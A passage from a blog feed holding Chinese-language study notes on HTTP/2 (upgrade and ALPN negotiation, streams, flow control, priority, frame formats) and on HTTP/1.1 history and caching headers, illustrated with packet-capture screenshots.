class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>server.example.com<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade, HTTP2-Settings<span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>h2c<span class="hljs-attribute">HTTP2-Settings</span><span class="hljs-punctuation">: </span>&lt;base64url encoding of HTTP/2 SETTINGS payload&gt;</code></pre></div></div><p>客户端通过 <code>Upgrade</code>头部字段列出所希望升级到的协议和版本，多个协议之间用英文逗号和空格（0x2C,0x20）隔开。这里只有h2c。</p><p>如果服务端不同意升级或者不支持 <code>Upgrade</code>所列出的协议，直接忽略即可（当成 HTTP/1.1 请求，以 HTTP/1.1响应）；如果服务端同意升级，那么需要这样响应：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f8w3qilmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-f8w3qilmrh9u6a"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">101</span> Switching Protocols<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>upgrade<span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>h2c<span class="language-lasso"><span class="hljs-meta">[</span><span class="hljs-params">...</span> <span class="hljs-built_in">data</span> defined <span class="hljs-keyword">by</span> <span class="hljs-literal">new</span> protocol <span class="hljs-params">...</span><span class="hljs-meta">]</span></span></code></pre></div></div><p>可以看到，HTTP Upgrade 响应的状态码是<code>101</code>，并且响应正文可以使用新协议定义的数据格式。</p><p>同时注意到，客户端发的头部有一个<code>HTTP2-Settings</code>字段。这个与HTTP/1.1有所不同。<a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc7540">RFC7540</a> 要求进行 HTTP/2 协商的客户端在 Header 中必须包含且仅包含一个<code>HTTP2-Settings</code> 字段, 这个字段的值是 base64 编码的 HTTP/2SETTINGS frame (将在下面具体讨论), 用于客户端向服务端传递一些配置参数,若客户端在协商阶段发送的 Request 的 Header中没有包含这个字段或多于一个该字段, 则服务端不能 (MUST NOT) 升级为HTTP/2 协议。</p><h3 id="https协商">HTTPS协商</h3><p>由于 TLS 的拓展字段支持 ALPN (Application-Layer Protocol Negotiation,应用层协议协商), 即在进行 TLS 握手的同时本身可以通过 ALPN知晓对方使用的应用层协议是什么，因此通过 ALPN拓展字段已经协商好了双方使用的应用层协议, 因此当 TLS握手完成后便可以进行 HTTP/2 的通信交互了。</p><p>这一点怎么验证呢？ALPN拓展是在TLS的Say Hello阶段的。我们找到它：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142655503186_353_image-20230829105143660.png" alt="image-20230829105143660"><figcaption aria-hidden="true">image-20230829105143660</figcaption></figure><p>最后一行就是。</p><p>然后点开<code>Transmission Control Protocol</code>即TLS，然后找到<code>Handshake Protocol:Client Hello</code>，点开就可以看到一堆拓展。然后我们就能看到ALPN了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142656507459_485_image-20230829105347601.png" alt="image-20230829105347601"><figcaption aria-hidden="true">image-20230829105347601</figcaption></figure><p>分析得知，浏览器在进行SSL连接，第一次发送ClientHello包时，在扩展字段里携带浏览器支持的版本，其中 h2代表浏览器支持http2协议。</p><p>相应的，服务器在返回Server Hello包时，如果服务器支持http2，则会返回h2，如果不支持，则从客户端支持的协议列表中选取一个它支持的协议，一般为http/1.1。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142657588930_231_image-20230829105644589.png" alt="image-20230829105644589"><figcaption aria-hidden="true">image-20230829105644589</figcaption></figure><p>在 HTTP/2 协议中, 客户端和服务端都需要发送 Connection Preface，以便最终确认双方使用 HTTP/2 协议进行交互, 并且在 Connection Preface中可以对协议参数做一些初始化的工作。对于客户端来说, 当收到服务端 101状态码的响应 (通过 HTTP Upgrade 进行协议协商) 或 TLS 握手成功 (通过 TLSALPN 进行协议协商) 后, 便立即开始发送 Connection Preface。</p><p>Connection Preface 的开头是一个固定的字节序列(可以认为这是一个魔数,一般在设计网络协议时都会设置一个魔数以过滤掉不支持的数据),这个值用字符串表示为 <code>PRI *  HTTP/2.0\r\n\r\nSM\r\n\r\n</code>,在此序列后跟随发送一个可选的 SETTINGS frame,其中可以设置一些协议参数(将在下面讨论), 服务端的 Connection Preface不需要魔数, 但同样需要包含一个可选的 SETTINGS frame用于设置服务端的协议参数, 无论是客户端还是服务端, 当收到不合法的Connection Preface 都需要报告连接错误。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142658796661_863_image-20230829110305712.png" alt="image-20230829110305712"><figcaption aria-hidden="true">image-20230829110305712</figcaption></figure><h2 id="http2-stream">HTTP/2 Stream</h2><p><strong>流(Stream)</strong> 是 HTTP/2 协议的核心, 因为在 HTTP/1.x 中,所有的请求都是在单个 TCP 连接上顺序发送的, HTTP/2 引入了 Stream 的概念,Stream 实际上是一个逻辑概念, 是虚拟的, 并非真实存在的对象。</p><p>一个 TCP 连接上可以同时存在多个 Stream, 这些 Stream可以并发地传输数据这些数据被称作<strong>帧(Frame)</strong>。因此实际上,HTTP/2 Stream 是对 TCP 连接的多路复用 (Multiplexing)。</p><p>后面的内容若提到“流”均指<code>Stream</code>，提到”帧“均指<code>Frame</code>。</p><p>在 Frame 的结构中我们看到, Frame Header 中有 Stream Identifier 字段,用于指示该 frame 所属的 Stream 序号, 当一个 Stream Identifier 为 N 的frame 在 TCP 链路上传输时, 我们就可以认为它是在 Stream N 上传输. Stream需要由一方主动创建, <a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc6455">RFC7540</a> 要求<strong>由客户端初始化的 Stream, 其编号 (即 Identifier)必须是奇数, 而由服务端初始化的 Stream,其编号必须是偶数</strong>。特别地, 编号为 0 的 Stream 是用来传输整个(TCP) 连接的控制消息的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142659977825_226_image-20230829112913643.png" alt="image-20230829112913643"><figcaption aria-hidden="true">image-20230829112913643</figcaption></figure><p>在 HTTP/2 中, 每一个新创建的 Stream 的编号必须比已有的所有的 Stream的编号都大, 当使用新编号的 Stream 时, 所有低于该编号的并且处于空闲(Idle) 状态的 Stream 都会被隐式的关闭, 在一个 TCP 链接中,流编号不能重复使用, 即新创建的 Stream编号不能是之前用过的编号(即便是之前用过的编号并且已关闭也不允许再使用),在 frame 中, 由于流编号只有 31 位, 因此对于一个 TCP 长连接来说,存在流编号被用光的情形, 当流编号用尽时, 如果需要再创建一个新的 Stream,对于客户端来说, 可以创建一个新的 TCP 连接, 对于服务端来说,可以向客户端发送一个 GOAWAY frame, 强制客户端打开新的一个 TCP 连接。</p><h3 id="流的生命周期">流的生命周期</h3><p>Flags 字段可以用来控制帧的状态。下图展示了一个流的生命周期。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142701018586_639_image-20230829115727462.png" alt="image-20230829115727462"><figcaption aria-hidden="true">image-20230829115727462</figcaption></figure><p>其中<code>PUSH_PROMISE</code>帧是一种特殊类型的帧，用于服务器推送资源给客户端。<strong>HTTP/2的推送机制</strong>允许服务器在响应一个客户端请求时，主动推送其他相关的资源给客户端，从而提前加载可能需要的资源，以改善页面加载性能和用户体验。</p><p>图中Reserved状态表示，在流上发送PUSH_PROMISE帧会将这个流留存供以后使用。具体的说当服务器向客户端发送PUSH_PROMISE帧，通知客户端它将会推送一个新的关联流（promisedstream），这个新流会被标记为<code>reserved (local)</code>状态。在接收到客户端的同意（或拒绝）之前，服务器会保留对该流的控制权。相应的，当客户端收到这个帧时候对于客户端来说这个新流就是<code>reserved (remote)</code>状态。</p><h3 id="流控制">流控制</h3><h4 id="流量控制">流量控制</h4><p>HTTP/2 在单个 TCP 连接上虚拟出多个 Stream, 多个 Stream 实现对一个 TCP连接的多路复用, 为了合理地利用传输链路,实现在有限资源内达到传输性能的最优化, 必须对 Stream 做一定的控制, HTTP/2本身只在逻辑层面规定了流控制的语义,具体的实现算法由协议的实现者自行决定, 类似于定义了一组抽象接口,具体的实现交由程序员去完成, HTTP/2 的流量控制有如下几个特点：</p><ul><li>HTTP/2 的流控制与 TCP 的流量控制有些类似, 但不完全相同, 双方发送WINDOW_UPDATE frame 以字节为单位来指示自身所接受的窗口大小,双方都必须遵守对方设置的窗口大小, <a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc6455">RFC7540</a> 规定的初始化窗口大小为 65535 个字节</li><li>只有 DATA frame 受流控制的约束, 对于其它类型的 frame 不受该规则限制,从而确保控制类的 frame 不会因流控约束而无法(及时)发送, 并且 HTTP/2的流控制双方都必须严格遵守, 流控制在 HTTP/2 中不能被关闭 (disable),当发送方不需要进行流控制时可以发送 WINDOW_UPDATE frame将窗口的值设置为最大值 , 但它仍然需要遵守对方设置的窗口限制。</li></ul><h4 id="优先级">优先级</h4><p>由于在一个 TCP 上存在多个 Stream, 而底层的传输层连接只有一个,为了更好地利用有限的资源, HTTP/2 对流引入了优先级的概念,引入优先级一方面向对方表达自身希望对方为该流分配资源的权重, 另一方面,对自身来说, 当资源有限时, 流的优先级可以用于决策优先发送哪个流上的frame, 可以通过标记一个流依赖于另一个流的完成来表征它的优先级,并且为依赖关系分配一个相对的权重, 举例来说, 若流 A 依赖于流 B, 则称流 A是流 B 的从属流 (dependent stream), 流 B 是流 A 的父级流 (parentstream), 一个流可以被任意个其它流所依赖, 例如流 B, C 可以同时依赖于流 A,它们都是流 A 的从属流, 可以用如下所示的图示来表示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gh47aslmrh9u6a"></i><span>text</span><div class="collapse show" id="collapse-gh47aslmrh9u6a"><pre><code class="hljs text">  A                 A / \      ==&gt;      /|\B   C             B D C</code></pre></div></div><p>可以在创建流的时候通过 HEADERS frame (将在下面讨论)指示该流所依赖的流, 当流创建完成以后也可以通过 PRIORITY frame来改变流的优先级, 在设置流的依赖关系时, 可以在 frame header 中设置exclusive flag 来指示该流的排他性, 在上面的例子中, 我们看到流 B C同时依赖于 A, 若不设置 exclusive flag 我们可以继续创建流 D 使其与流 B C一样都在同一级依赖于流 A, 而若设置了 exclusive flag,那么流的层级依赖关系将如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jpxj1klmrh9u6a"></i><span>text</span><div class="collapse show" id="collapse-jpxj1klmrh9u6a"><pre><code class="hljs text">                    A  A                 | / \      ==&gt;       DB   C              / \                  B   C</code></pre></div></div><p>在这里例子中, 原先 B C 都依赖于流 A, 而创建流 D 时, 在 frame 中设置了exclusive flag, 这样以来只有流 D 直接依赖于流 A, 而原先的流 B C的父级流都将更改为流 D。</p><p>依赖的权重 (Weight) 用于决定流所能分配的资源(这个资源可能是多维度的,如为该流分配的内存等), 在 HTTP/2 中, 流的权重是一个 1~256 的整数,权重越大, 分配到的资源便越多, 举例来说, 假设流 B 和流 C 同时依赖于流 A,流 B 的依赖权重为 4, 流 C 的依赖权重为 12, 当流 A 的操作都完成以后或流 A处于阻塞状态暂时无法继续进行更多的操作, 在理想情况下, 流 B分配到的资源应是流 C 分配到的资源总量的 <span class="math inline">\(\frac{1}{3}\)</span>。</p><p>当然, 流的权重和优先级在 HTTP/2 中只是建议, 通信双方应该 (SHOULD)尽可能遵守这些规则, 但并不强制,通信的任何一方都不能强制要求对方必须按照流的优先级对流进行处理或严格按照权重比例进行资源分配,任何流都有依赖的流, 没有显示指明依赖流的流都依赖于编号为 0x0 的流。</p><p>比如，下面请求CDN上相关js和css文件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142702230552_298_image-20230829141914005.png" alt="image-20230829141914005"><figcaption aria-hidden="true">image-20230829141914005</figcaption></figure><p>第一份javascript文件不指明依赖流，权重最高。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142705943679_812_image-20230829142038049.png" alt="image-20230829142038049"><figcaption aria-hidden="true">image-20230829142038049</figcaption></figure><p>后面几个流依次依赖前面的流。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142707262834_965_image-20230829142143613.png" alt="image-20230829142143613"><figcaption aria-hidden="true">image-20230829142143613</figcaption></figure><p>CSS文件流是js文件流的从属流，权重较低。</p><h2 id="http2-frame">HTTP/2 Frame</h2><p>我们在计网课上学过，HTTP/2是使用二进制分帧传输的。在这里便对帧涉及到的细节进行讲述。</p><p>在 HTTP/2 中, frame 是客户端和服务端数据传输的最小单元, 当 HTTP/2Connection Preface 都发送校验完毕之后, 双方就可以正式开始以 frame的形式进行数据交换, frame 由 Header 和 Payload 两部分构成, 其中 Header(注意区分 frame 的 Header 和 HTTP 协议本身的 Header) 的长度固定为 9字节, Payload 的长度是可变的, frame 的结构<a href="https://datatracker.ietf.org/doc/html/rfc7540#page-12">如下所示</a>:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142708629121_799_image-20230829110616241.png" alt="image-20230829110616241"><figcaption aria-hidden="true">image-20230829110616241</figcaption></figure><ul><li><code>Length</code> 字段长度为 3 字节, 以字节为单位指示 frame 的Payload 的长度(即该字段指示的长度不包含 9 字节的 frame header)</li><li><code>Type</code> 字段长度为 1 字节, 指示 frame 的类型</li><li><code>Flags</code> 字段长度为 1 字节, Flags 字段与 frame 的类型有关,以 bit 位来表征特定类型 frame 的特定设置</li><li><code>R</code> 字段长度为 1 比特, 它是 Reserve 的首字母,即该字段是保留字段, 目前必须设置为 0</li><li><code>Stream Identifier</code> 是 31 位的无符号整数,它的值代表流编号, 当该字段非 0 时, 表示当前帧属于某个特定的 Stream ,当其为 0 时, 代表该帧是属于整个 TCP 连接的</li></ul><p>因为 Length 字段的长度为 3 字节, 所以在 HTTP/2 中, 一个 frame的最大长度为 <span class="math inline">\(2^{24}\)</span> 字节的 Payload+ 9 字节的 header, 在实际交互中, 客户端和服务端任何一方都可以通过<code>SETTINGS</code> frame 来设置自己所接受的 frame payload 的最大长度,这个长度的范围可以取<span class="math inline">\(2^{14}\)</span> 到 <span class="math inline">\(2^{24}-1\)</span> (以字节为单位)的区间内任意一个值, 当设置了该最大值时, 若在以后的通信中接收到的 frame的 payload 超过之前的设定, 则接收方应发送 <code>FRAME_SIZE_ERROR</code>错误, 尽管在 HTTP/2 中, frame payload 最大可以设置为 <span class="math inline">\(2^{24}-1\)</span> 个字节的大小, 但对于时延敏感的frame (如 <code>RST_STREAM</code>, 类似于 TCP 的 rst, 用于复位连接) 当frame 数据过大时传输效率低下, 将会影响整体的性能。</p><p>以下面这个<code>SETTING</code>帧为例。这是一个没有载荷的<code>SETTING</code>帧，是客户端向服务器发ACK。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142709689208_586_image-20230829111247968.png" alt="image-20230829111247968"><figcaption aria-hidden="true">image-20230829111247968</figcaption></figure><h3 id="data-帧">DATA 帧</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142710882929_634_image-20230829123200882.png" alt="image-20230829123200882"><figcaption aria-hidden="true">image-20230829123200882</figcaption></figure><p>我们看到第一个字段是<code>Pad Length</code>。它是干什么的呢？frame可以选择性的传输 padding, padding 用于隐藏实际的 payload长度，以便达到<strong>隐私保护</strong>的目的。观察者可能通过观察数据包大小来推测出某些请求的内容。通过在帧中添加填充数据，可以使所有请求的数据包大小相似，从而增强用户数据的隐私保护。</p><p>当需要使用 padding 时, 需要在 frame header 中设置标志, padding的标志值为 <code>0x8</code>, 在设置标识时可以将所有标识位按位或,写到标识位对应的 offset 上, 它的标志值为<code>0x8</code>代表需要将标识字段的第四位二进制位设置成 1。</p><p>当设置了 padding 标识后, <code>Pad length</code> 字段指示 padding的长度, 而<code>Padding</code> 字段便是相应长度的数据,这里的数据是没有任何语义的, 需要都设置为 0。 接收方若收到设置了 padding标识的 DATA frame, 并且它的 padding 字段非 0 可以返回<code>Connection Error</code>。若 Pad length 指示的长度与实际的 padding长度不匹配, 则接收方应立即报告 <code>Connection Error</code>。</p><p>以下面这个博客css文件的DATA帧为例，就没有padding。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142711803565_423_image-20230829123341595.png" alt="image-20230829123341595"><figcaption aria-hidden="true">image-20230829123341595</figcaption></figure><p>前面讲到了流的生命周期，DATA frame 只能在状态为 open 或 half-closed(remote) 状态的 Stream 上发送, 当接收方收到不属于这两种状态的 Stream 的DATA frame 时, 应立即报告 <code>STREAM_CLOSED</code> 的<code>Stream Error</code>。</p><h3 id="headers-帧">HEADERS 帧</h3><p><code>HEADERS</code> frame 用来初始化一个新的 Stream 或传输 HTTP/2Header Block (将在下面讨论), <code>HEADERS</code> frame 的 frame type 为0x1, 它的 Payload 结构<a href="https://datatracker.ietf.org/doc/html/rfc7540#page-32">如下所示</a>:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142713340881_806_image-20230829114341902.png" alt="image-20230829114341902"><figcaption aria-hidden="true">image-20230829114341902</figcaption></figure><p><code>Pad Length</code>前面已经讲述过，不再赘述。</p><p><code>E</code>, 长度为 1 比特, 作为一个放在 Payload 中的标志位,用来指示是否开启 exclusive flag 。当且仅当在 frame 的 header 中设置了PRIORITY flag 时, 该字段有效。</p><p><code>Stream Dependency</code>, 长度为 31 比特,用来指示该流所依赖的流 。</p><p><code>Weight</code>, 长度为 1 字节,用于设置依赖的权重。值的有效范围为 1 ~ 256, 当且仅当在 frame 的 header中设置了 PRIORITY flag 时, 该字段有效。</p><p><code>Header Block  Fragment</code>是指头部块片段，它是用于在头部压缩上下文中传输HTTP头部信息的一部分。HTTP/2使用了HPACK压缩算法来减少头部信息的传输大小，从而提高传输效率。在头部信息较大时，可以将头部分成多个片段，每个片段被称为"HeaderBlockFragment"。头部压缩技术的细节还是有些复杂的，后面会专门拎出来讲。</p><p>简单的说，HTTP/2的头部压缩使用了静态表（StaticTable）和动态表（DynamicTable）来存储已经发送或接收的头部字段，以便更有效地传输这些字段。当发送或接收头部信息时，可以参考这些表来减少重复传输。如果头部信息太大，就可以将其分割成多个片段，在传输过程中逐个发送。</p><h2 id="总结">总结</h2><p>综上，这一部分的内容对HTTP/2的流机制和分帧传输方式进行了非常详尽的介绍。在其中也简单的介绍了服务器推送相关的内容。可以通过<a href="https://http2.akamai.com/demot">这个网站</a>体会HTTP/1.1和HTTP/2的性能差距，当然也可以对此进行抓包分析。这一部分尚未介绍的是头压缩机制。后面将会展开讲述。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重新认识HTTP/1.1</title>
    <link href="/posts/46285/"/>
    <url>/posts/46285/</url>
    
    <content type="html"><![CDATA[<h1 id="重新认识http1.1">重新认识HTTP/1.1</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/31511/">上一部分</a>主要讲了HTTP最基本的东西，包括HTTP的结构，以及连接管理，状态保存和用户认证相关的知识。上述内容基本不脱离课程所学，属于是我们必须熟知的最最基本的东西。这一部分主要从HTTP的发展过程来进行HTTP的学习，标题也改成了“重新认识HTTP”。</p><h2 id="总览">总览</h2><p>HTTP是由Tim Berners-Lee 博士和他的团队在 1989-1991年间创造出它以来，三十多年来，HTTP已经发生了太多的变化，在保持协议简单性的同时，不断扩展其灵活性。如今，HTTP已经从一个只在实验室之间交换文件的早期协议进化到了可以传输图片，高分辨率视频和3D 效果的现代复杂互联网协议。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP">这篇文章</a>简要的概括了HTTP的发展历史。同时下图也简要的概括了HTTP发展过程中发生的重大变化。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222828497443_442_image-20230826164236772.png" alt="image-20230826164236772"><figcaption aria-hidden="true">image-20230826164236772</figcaption></figure><h2 id="http最初的样子">HTTP最初的样子</h2><p>最初版本的 HTTP 协议并没有版本号，后来它的版本号被定位在<code>0.9</code> 以区分后来的版本。<code>HTTP/0.9</code>极其简单：请求由单行指令构成，以唯一可用方法GET开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8g89kvlmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-8g89kvlmrh9u6a"><pre><code class="hljs http">GET /mypage.html</code></pre></div></div><p>响应也极其简单的：只包含响应文档本身。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7ymvzmlmrh9u6a"></i><span>html</span><div class="collapse show" id="collapse-7ymvzmlmrh9u6a"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  这是一个非常简单的 HTML 页面<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></div><p>跟后来的版本不同，<code>HTTP/0.9</code> 的响应内容并不包含 HTTP头。这意味着只有 HTML文件可以传送，无法传输其他类型的文件。也没有状态码或错误代码。一旦出现问题，一个特殊的包含问题描述信息的HTML 文件将被发回，供人们查看。</p><p>可以看出，这样简单的协议从一开始更像是局域网中获取资源的一种约定。</p><h2 id="http1.0">HTTP1.0</h2><p><code>HTTP/0.9</code>几乎没有什么可拓展性，而<code>HTTP/1.0</code>增加的这些特性，可以很明显的看出希望HTTP协议的用途更加广泛，并且便于后续进行拓展。</p><ul><li>协议版本信息现在会随着每个请求发送（<code>HTTP/1.0</code> 被追加到了<code>GET</code> 行）。</li><li>状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。</li><li>引入了 HTTP标头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。</li><li>在新 HTTP 标头的帮助下，具备了传输除纯文本 HTML文件以外其他类型文档的能力（凭借<code>Content-Type</code> 标头）。</li></ul><h2 id="http1.1">HTTP1.1</h2><p><code>HTTP/1.1</code> 消除了大量歧义内容并引入了多项改进：</p><ul><li>连接可以复用，节省了多次打开 TCP 连接加载网页文档资源的时间。</li><li>增加流水线技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。</li><li>支持响应分块。</li><li>引入额外的缓存控制机制。</li><li>引入内容协商机制，包括语言、编码、类型等。并允许客户端和服务器之间约定以最合适的内容进行交换。</li><li>凭借 <code>Host</code>标头，能够使不同域名配置在同一个 IP地址的服务器上。</li></ul><p>连接复用和流水线技术已经在<a href="https://lunaticsky-tql.github.io/posts/31511/">认识HTTP(二)</a>中有所讲述，这里再继续讲解一些其他的一些机制。</p><h3 id="缓存策略">缓存策略</h3><p>关于控制缓存策略的参数，最好的参考资料还是<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control">第一手资料</a>。这里对常见的控制策略进行讲解，以便更快的理解常见的情形。</p><ol type="1"><li>首先，浏览器端会根据<code>cache-control</code>是否是<code>no-store</code>来判断是否可以对返回的数据进行缓存，如果是<code>no-store</code>表示不允许缓存，之后的请求都不会走缓存，而是重新想向务器端发送请求。</li><li>如果不是<code>no-store</code>，一般情况下就是只返回<code>max-age: xxx</code>来告诉浏览器端可以对数据进行缓存，并且设置缓存的失效时间，通过<code>max-age</code>有时候会搭配<code>no-cache</code>或者<code>must-revalidate</code>一起返回，<code>no-cache</code>和<code>must-revalidate</code>就是控制要去服务器端进行验证数据是否真的有变化。关于两者的区别后面会讲述。</li><li>那如何验证变化呢？就是借助<code>Last-Modified/if-Modified-Since</code>，或者<code>ETag/If-None-Match</code>来判断，如果确实有变化，则返回最新数据，如果没有变化，则返回<code>304</code>，同时更新缓存的失效时间。</li></ol><p>下面对上述提到的概念进行详细的表述，可以对照查看。</p><h4 id="缓存控制">缓存控制</h4><p>缓存控制是通过<code>cache-control</code>这个字段进行的。</p><h6 id="服务器">服务器</h6><ul><li><code>max-age</code>：表示缓存在几s后会失效，是一个相对时间，但是要注意的是，该时间是从响应报文创建的时间就开始计时。</li><li><code>no-store</code>:表示不允许缓存，通常一些频繁变化的页面，需要设置该选项。</li><li><code>no-cache</code>:该字段表示<strong>允许缓存</strong>，但是<strong>使用缓存之前必须要先去服务器端验证是否过期</strong>，如果没过期，则使用缓存，如果过期了，则返回最新数据。</li><li><code>must-revalidate</code>:表示<strong>允许缓存，并且如果缓存不过期的话，先使用缓存，如果缓存过期的话，再去服务器端进行验证，</strong>（如果验证有变化，则返回最新资源，如果验证没变化，则返回<code>304 Not Modified</code>，然后更新<code>max-age</code>的失效时间。同时注意，并不是缓存过期了浏览器就一定需要删除缓存）。</li></ul><h6 id="客户端">客户端</h6><p>服务器端如何在响应头中添加响应的字段来浏览来是否可以使用缓存，同样，客户端自己也可以控制，即浏览器也可以在请求中中添加<code>cache-control</code>等字段。</p><ol type="1"><li>浏览器刷新</li></ol><p>即我们按F5刷新页面的时候，该页面的http请求中会添加：<code>cache-control:max-age:0</code>。注意这时候如果服务器的缓存控制策略没有<code>must-revalidate</code>的话，浏览器还可能继续使用这个缓存，异步地发送一个条件性GET请求（带有<code>If-Modified-Since</code>或<code>If-None-Match</code>头部），以验证资源是否仍然有效。然后如果服务器返回304响应，表示资源仍然有效，浏览器会再更新一次过期时间。但是由于这个过程是“先斩后奏”的，用户大部分时候感觉不到这个过程，打开F12也会发现“已缓存”的字样。</p><ol start="2" type="1"><li>浏览器强制刷新</li></ol><p>即我们按ctrl+f5强制刷新页面的时候，该页面的http请求会添加：<code>cache-control:no-cache</code>;即表示此时要首先去服务器端验证资源是否有更新，如果有更新则直接返回最新资源，如果没有更新，则返回304，然后浏览器端判断是304的话，则从缓存中读取数据。</p><ol start="3" type="1"><li>浏览器前进后退重定向</li></ol><p>当我们点击浏览器的前进后退操作时，这个时候请求中不会有<code>cache-control</code>的字段，没有该字段，就表示会检查缓存，直接利用之前的资源，不再重新请求服务器。</p><p>另外，<code>expires</code>是HTTP1.0时的头选项。浏览器会优先使用<code>cache-control</code>来判断缓存是否过期。如果只返回了<code>expires</code>，则浏览器会将<code>expires</code>转换为<code>cache-control</code>来判断缓存是否过期。如果同时返回了<code>cache-control</code>和<code>expires</code>两个响应头，浏览器会优先使用<code>cache-control</code>来判断缓存是否过期</p><h4 id="缓存验证">缓存验证</h4><p>浏览器判断顶多是根据服务器端返回的失效时间去判断，这样并不一定准确，因为很可能出现缓存失效的情况，但其实资源并没有发生变化，这个时候其实也是应该走缓存的，那如何判断资源有没有发生变化呢？这必须交给服务器端来判断了。下面介绍通过<code>Last-Modified/If-Modified-Since</code>，和<code>ETag/If-None-Match</code>两种策略判断。后者是优先于前者的。</p><ol type="1"><li><code>Last-Modified/If-Modified-Since</code></li></ol><p>即该字段是服务器端返回给客户端的响应头字段，表示当前请求的资源的最后修改时间，如果响应头中有该字段，那么下次请求的时候，请求头中就会包含<code>If-Modified-Since</code>字段，它的值就是<code>Last-Modified</code>的值，这样服务器端收到该字段的值，就可以和对应的资源最终的修改时间做对比，如果发生变化，则说明资源发生了变化，则返回最新资源（此时状态码是200），如果没有发生变化，则返回304，浏览器从缓存中直接去数据即可。</p><ol start="2" type="1"><li><code>ETag/If-None-Match</code></li></ol><p>使用资源的最后更改时间作为判断资源是否更改可能会有问题？比如：资源改了之后，又改了回来，这时虽然资源的最后修改时间发生了变化，但其实资源内容本身没有发生变化，其实这种情况也应该是走缓存的，所以才出现了<code>ETag</code>字段，表示资源的唯一标识，那如果响应头中有该字段，则下次请求的时候，请求头中就会有<code>If-None-Match</code>字段，它的值就是<code>ETag</code>的值，服务器端收到以后，就会和当前资源的唯一表识别去对比，如果不一样，则说明资源发生变化，返回最新数据即可（此时状态码是200），如果一样，则说明资源没有变化，返回304，浏览器从缓存中读取数据。</p><h3 id="内容协商">内容协商</h3><h4 